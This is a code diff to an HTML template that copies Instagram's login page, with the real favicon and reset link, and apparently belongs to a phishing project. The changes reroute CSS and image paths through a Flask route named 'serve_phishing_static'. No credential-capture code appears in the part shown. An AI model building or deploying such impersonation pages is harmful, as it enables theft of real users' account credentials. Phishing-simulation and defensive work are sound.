@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login · Instagram</title>
-  <link rel="stylesheet" href="../static/css/instagram.css">
+  <link rel="stylesheet" href="{{ url_for('serve_phishing_static', filename='css/instagram.css') }}">
   <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" type="image/x-icon">
 </head>
 <body>
@@ -20,7 +20,7 @@
         <span>OR</span>
       </div>
       <button class="facebook-login">
-        <img src="../static/images/facebook-logo.png" alt="Facebook Icon">
+        <img src="{{ url_for('serve_phishing_static', filename='images/facebook-logo.png') }}" alt="Facebook Icon">
         Log in with Facebook
       </button>
       <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot password?</a>
